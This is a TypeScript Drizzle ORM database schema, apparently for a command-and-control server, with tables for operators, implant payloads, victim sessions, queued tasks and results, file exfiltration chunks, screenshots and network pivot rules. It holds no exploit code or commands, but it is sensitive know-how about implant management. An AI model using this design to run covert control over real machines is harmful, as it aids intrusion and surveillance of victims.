/**
 * D1 schema（Drizzle ORM / SQLite dialect）。
 *
 * 这是**唯一真源**：`drizzle-kit generate` 由它生成 `db/migrations/*.sql`，
 * 文档 `docs/02-architecture/03-data-model.md` 与它逐字段对应。
 *
 * 约定：
 *   - 时间统一 unix 秒（integer）
 *   - 布尔统一 integer 0/1
 *   - 大文本/二进制**不放这里**（走 R2），表里只存 key 与元数据
 */

import { sql } from 'drizzle-orm';
import { index, integer, primaryKey, sqliteTable, text, uniqueIndex } from 'drizzle-orm/sqlite-core';

const now = sql`(unixepoch())`;

/* ───────────────────────────── settings ───────────────────────────── */

export const settings = sqliteTable('settings', {
  k: text('k').primaryKey(),
  v: text('v').notNull(),
  updatedAt: integer('updated_at').notNull().default(now),
});

/* ───────────────────────────── operators / keys ───────────────────────────── */

export const operators = sqliteTable(
  'operators',
  {
    id: text('id').primaryKey(),
    username: text('username').notNull(),
    displayName: text('display_name'),
    role: text('role').notNull().default('operator'),
    passwordHash: text('password_hash'),
    disabled: integer('disabled').notNull().default(0),
    createdAt: integer('created_at').notNull().default(now),
    lastLoginAt: integer('last_login_at'),
  },
  (t) => [uniqueIndex('idx_operators_username').on(t.username)],
);

export const operatorKeys = sqliteTable(
  'operator_keys',
  {
    id: text('id').primaryKey(),
    operatorId: text('operator_id').notNull(),
    keyId: text('key_id').notNull(),
    pubRaw: text('pub_raw').notNull(),
    fp: text('fp').notNull(),
    createdAt: integer('created_at').notNull().default(now),
    revokedAt: integer('revoked_at'),
  },
  (t) => [
    uniqueIndex('idx_operator_keys_unique').on(t.operatorId, t.keyId),
    index('idx_operator_keys_fp').on(t.fp),
  ],
);

/* ───────────────────────────── payloads ───────────────────────────── */

export const payloads = sqliteTable(
  'payloads',
  {
    id: text('id').primaryKey(),
    name: text('name').notNull(),
    pskId: text('psk_id').notNull(),
    /** HKDF(psk, "stc2/v1/reg") —— 服务端只存派生值，不存 psk 本体 */
    kReg: text('k_reg').notNull(),
    /** HKDF(psk, "stc2/v1/sess") */
    kSess: text('k_sess').notNull(),
    os: text('os'),
    arch: text('arch'),
    r2Key: text('r2_key'),
    size: integer('size'),
    sha256: text('sha256'),
    note: text('note'),
    createdAt: integer('created_at').notNull().default(now),
    expiresAt: integer('expires_at'),
    revokedAt: integer('revoked_at'),
  },
  (t) => [uniqueIndex('idx_payloads_psk').on(t.pskId), index('idx_payloads_created').on(t.createdAt)],
);

/* ───────────────────────────── sessions ───────────────────────────── */

export const sessions = sqliteTable(
  'sessions',
  {
    id: text('id').primaryKey(),
    payloadId: text('payload_id'),
    host: text('host'),
    username: text('username'),
    os: text('os'),
    arch: text('arch'),
    pid: integer('pid'),
    internalIp: text('internal_ip'),
    externalIp: text('external_ip'),
    asn: text('asn'),
    country: text('country'),
    /** JSON 数组字符串 */
    caps: text('caps'),
    /** b64u(65B) P-256 未压缩点 */
    implantPub: text('implant_pub'),
    ownerKeyId: text('owner_key_id'),
    status: text('status').notNull().default('online'),
    note: text('note'),
    tags: text('tags'),
    firstSeen: integer('first_seen').notNull().default(now),
    lastSeen: integer('last_seen').notNull().default(now),
    closedAt: integer('closed_at'),
  },
  (t) => [
    index('idx_sessions_status_seen').on(t.status, t.lastSeen),
    index('idx_sessions_payload').on(t.payloadId),
  ],
);

/* ───────────────────────────── tasks / results ───────────────────────────── */

export const tasks = sqliteTable(
  'tasks',
  {
    id: text('id').primaryKey(),
    sessionId: text('session_id').notNull(),
    operatorId: text('operator_id'),
    rid: text('rid'),
    cat: text('cat').notNull(),
    status: text('status').notNull().default('queued'),
    size: integer('size'),
    attempts: integer('attempts').notNull().default(0),
    idemKey: text('idem_key'),
    createdAt: integer('created_at').notNull().default(now),
    dispatchedAt: integer('dispatched_at'),
    completedAt: integer('completed_at'),
    expiresAt: integer('expires_at'),
    err: text('err'),
  },
  (t) => [
    index('idx_tasks_session_created').on(t.sessionId, t.createdAt),
    index('idx_tasks_status').on(t.status, t.createdAt),
    uniqueIndex('idx_tasks_idem').on(t.operatorId, t.idemKey),
  ],
);

export const taskResults = sqliteTable(
  'task_results',
  {
    id: text('id').primaryKey(),
    taskId: text('task_id').notNull(),
    sessionId: text('session_id').notNull(),
    inlineCt: text('inline_ct'),
    r2Key: text('r2_key'),
    /** 解密所需的两样东西：GCM nonce 与请求 ID（都参与 AAD） */
    nonce: text('nonce'),
    rid: text('rid'),
    size: integer('size').notNull(),
    sha256: text('sha256'),
    truncated: integer('truncated').notNull().default(0),
    createdAt: integer('created_at').notNull().default(now),
  },
  (t) => [index('idx_results_task').on(t.taskId), index('idx_results_created').on(t.createdAt)],
);

/* ───────────────────────────── files / screens / pivot ───────────────────────────── */

export const files = sqliteTable(
  'files',
  {
    id: text('id').primaryKey(),
    sessionId: text('session_id').notNull(),
    direction: text('direction').notNull(),
    path: text('path'),
    name: text('name'),
    size: integer('size'),
    sha256: text('sha256'),
    status: text('status').notNull().default('open'),
    r2Prefix: text('r2_prefix').notNull(),
    chunksTotal: integer('chunks_total').notNull().default(0),
    chunksDone: integer('chunks_done').notNull().default(0),
    createdAt: integer('created_at').notNull().default(now),
    updatedAt: integer('updated_at').notNull().default(now),
  },
  (t) => [index('idx_files_session').on(t.sessionId, t.createdAt)],
);

export const fileChunks = sqliteTable(
  'file_chunks',
  {
    transferId: text('transfer_id').notNull(),
    idx: integer('idx').notNull(),
    size: integer('size').notNull(),
    sha256: text('sha256'),
    createdAt: integer('created_at').notNull().default(now),
  },
  (t) => [primaryKey({ columns: [t.transferId, t.idx] })],
);

export const screens = sqliteTable(
  'screens',
  {
    id: text('id').primaryKey(),
    sessionId: text('session_id').notNull(),
    r2Key: text('r2_key').notNull(),
    ts: integer('ts').notNull(),
    size: integer('size'),
    width: integer('width'),
    height: integer('height'),
    format: text('format').default('jpeg'),
  },
  (t) => [index('idx_screens_session').on(t.sessionId, t.ts)],
);

export const pivotRules = sqliteTable(
  'pivot_rules',
  {
    id: text('id').primaryKey(),
    sessionId: text('session_id').notNull(),
    kind: text('kind').notNull(),
    listenHost: text('listen_host'),
    listenPort: integer('listen_port'),
    targetHost: text('target_host'),
    targetPort: integer('target_port'),
    status: text('status').notNull().default('active'),
    createdAt: integer('created_at').notNull().default(now),
  },
  (t) => [index('idx_pivot_session').on(t.sessionId)],
);

/* ───────────────────────────── audit / quota / notes ───────────────────────────── */

export const auditLog = sqliteTable(
  'audit_log',
  {
    id: text('id').primaryKey(),
    ts: integer('ts').notNull().default(now),
    actorType: text('actor_type').notNull(),
    actorId: text('actor_id'),
    action: text('action').notNull(),
    target: text('target'),
    requestId: text('request_id'),
    ip: text('ip'),
    /** JSON；**不含命令明文** */
    meta: text('meta'),
  },
  (t) => [index('idx_audit_ts').on(t.ts), index('idx_audit_target').on(t.target, t.ts)],
);

export const quotaDaily = sqliteTable('quota_daily', {
  day: text('day').primaryKey(),
  workersReq: integer('workers_req').default(0),
  doReq: integer('do_req').default(0),
  d1RowsRead: integer('d1_rows_read').default(0),
  d1RowsWrite: integer('d1_rows_write').default(0),
  kvWrite: integer('kv_write').default(0),
  r2ClassA: integer('r2_class_a').default(0),
  r2ClassB: integer('r2_class_b').default(0),
  r2Bytes: integer('r2_bytes').default(0),
  notes: text('notes'),
});

export const notes = sqliteTable(
  'notes',
  {
    id: text('id').primaryKey(),
    operatorId: text('operator_id'),
    sessionId: text('session_id'),
    title: text('title').notNull(),
    bodyMd: text('body_md').notNull(),
    createdAt: integer('created_at').notNull().default(now),
    updatedAt: integer('updated_at').notNull().default(now),
  },
  (t) => [index('idx_notes_session').on(t.sessionId)],
);

/* ───────────────────────────── 便捷类型 ───────────────────────────── */

export type Session = typeof sessions.$inferSelect;
export type NewSession = typeof sessions.$inferInsert;
export type Task = typeof tasks.$inferSelect;
export type Payload = typeof payloads.$inferSelect;
export type OperatorKey = typeof operatorKeys.$inferSelect;
export type AuditRow = typeof auditLog.$inferSelect;
